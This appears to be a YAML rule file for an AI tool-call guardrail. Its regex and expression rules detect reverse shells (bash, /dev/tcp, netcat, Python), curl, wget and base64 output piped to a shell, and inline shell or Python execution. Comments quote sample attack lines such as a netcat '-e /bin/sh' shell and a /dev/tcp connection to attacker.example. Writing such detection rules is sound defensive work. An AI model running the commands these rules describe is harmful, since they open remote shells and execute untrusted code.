version: 1
category: command
rules:
  - id: CMD-REVSHELL-BASH
    expression: >-
      f.commands.exists(c, c.program in ['nc', 'nc.exe', 'ncat', 'ncat.exe', 'netcat', 'socat'] &&
      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CONNECT in c.operations ||
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_LISTEN in c.operations) &&
      f.paths.exists(p, p.command_id == c.id &&
      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_EXECUTE) &&
      f.network.exists(n, n.command_id == c.id &&
      n.action in [defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_CONNECT,
      defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_LISTEN] &&
      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]))
    pattern: '(?i)bash\s+-i\s+>&\s*/dev/tcp/'
    title: "Bash reverse shell"
    severity: CRITICAL
    confidence: 0.98
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-DEVTCP
    # Closes bash /dev/tcp also accepts hostnames
    # (e.g. exec 5<>/dev/tcp/attacker.example/4444), so match either
    # a dotted-quad IPv4 prefix OR a non-empty hostname-shaped token
    # followed by `/<port>`. The hostname branch demands at least one
    # `.` to keep precision (single-label local names like `host` are
    # rare on real reverse-shell targets and would create FPs against
    # benign /dev/tcp/<service> string fragments).
    pattern: '/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b'
    title: "Reverse shell via /dev/tcp"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-NC
    # Closes matches BOTH netcat reverse-shell forms:
    #   - destination-first:  nc 1.2.3.4 4444 -e /bin/sh
    #   - flag-first:         nc -e /bin/sh 1.2.3.4 4444
    # The non-capturing alternation lets either ordering trigger the
    # CRITICAL rule. The `-e|--exec` branch on either side is the
    # hard signal — netcat is rarely combined with -e/--exec for
    # legitimate operations.
    pattern: '(?i)\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)'
    title: "Netcat reverse shell with -e"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-PYTHON
    pattern: '(?i)python[23]?\s+-c\s+.*socket.*connect'
    title: "Python reverse shell"
    severity: CRITICAL
    confidence: 0.90
    tags: [execution, reverse-shell]
  - id: CMD-PIPE-CURL
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program in ['curl', 'curl.exe', 'invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm'] &&
      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_FETCH in c.operations ||
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in c.operations))
    # Candidate discovery covers POSIX curl pipelines and PowerShell web-cmdlet
    # aliases. The exact fallback contract proves stdout-to-interpreter flow.
    pattern: '(?i)(?:\bcurl\b\s+[^|;\r\n]*\|\s*(?:[/\w.-]+/)?(?:bash|zsh|sh|dash|ksh|python(?:[0-9.]*)?|perl|ruby)\b|\b(?:invoke-webrequest|iwr|invoke-restmethod|irm)\b[^|;\r\n]*\|\s*(?:invoke-expression|iex)\b)'
    title: "curl piped to shell"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, download-exec]
  - id: CMD-PIPE-WGET
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['wget', 'wget.exe'] &&
      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_FETCH in c.operations ||
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in c.operations))
    # Closes (parity with CMD-PIPE-CURL above).
    pattern: '(?i)\bwget\b\s+[^|]*\|\s*(?:[/\w.-]+/)?(?:bash|zsh|sh|dash|ksh|python(?:[0-9.]*)?|perl|ruby)\b'
    title: "wget piped to shell"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, download-exec]
  - id: CMD-PIPE-BASE64
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['base64', 'base64.exe'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_DECODE in c.operations)
    # Closes (parity with CMD-PIPE-CURL above).
    pattern: '(?i:\bbase64\b)[^|;\n]*\s(?:-d+i?|--decode)\b[^|;\n]*\|\s*(?i:(?:[/\w.-]+/)?(?:bash|zsh|sh|dash|ksh|python(?:[0-9.]*)?|perl|ruby))\b'
    title: "base64 decode piped to shell"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, obfuscation]
  - id: CMD-EVAL
    pattern: '(?i)\beval\s+["''\$\(]'
    title: "Shell eval with dynamic input"
    severity: HIGH
    confidence: 0.85
    tags: [execution]
  - id: CMD-BASH-C
    pattern: '(?i)\b(?:ba)?sh\s+-c\s+'
    title: "Shell -c execution"
    severity: LOW
    confidence: 0.55
    tags: [execution]
  - id: CMD-PYTHON-C
    pattern: '(?i)\bpython[23]?\s+-c\s+'
    title: "Python inline execution"
    severity: LOW
